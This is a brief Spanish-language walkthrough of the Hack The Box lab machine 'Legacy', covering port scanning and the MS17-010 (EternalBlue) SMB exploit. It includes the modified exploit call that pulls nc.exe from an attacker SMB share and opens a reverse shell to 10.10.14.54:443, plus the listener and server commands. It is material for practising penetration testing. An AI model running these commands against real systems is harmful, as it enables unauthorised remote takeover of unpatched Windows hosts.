# Hack The Box - Legacy


## Exploración

Todos los puertos, rapido y silencioso
<pre>
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.4 -oG allPorts
</pre>
 
Puertos especificos
<pre>
nmap -sCV -p139,445 10.10.10.4 -oN targeted


Como parece que SMB está activo podemos averiguar el tipo de maquina con:
<pre>
crackmapexec smb 10.10.10.4

SMB         10.10.10.4      445    LEGACY           [*] Windows 5.1 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True)
</pre>

El targeted nos indica que es un XP.
Probamos entonces el zzz de EthernalBlue
<pre>
git clone https://github.com/worawit/MS17-010
</pre>

Probamos con checker.py y modificamos el zzz_exploit.py poniendo esto donde encontramos CMD
<pre>
service_exec(conn, r'cmd /c \\10.10.14.54\smbFolder\nc.exe -e cmd 10.10.14.54 443')
</pre>

Localizamos nc y lo copiamos en nuestro directorio.

Abrimos servidor smb:
<pre>
impacket-smbserver smbFolder $(pwd) -smb2support
</pre>

Y en otra consola nos ponemos a la escucha:
<pre>
nc -nlvp 443
</pre>

En la primera consola ejecutamos el exploit:

<pre>
python2 zzz_exploit.py 10.10.10.4 spoolss
</pre>

Se entra ya con usuario administrador. No hay que escalar privilegios.
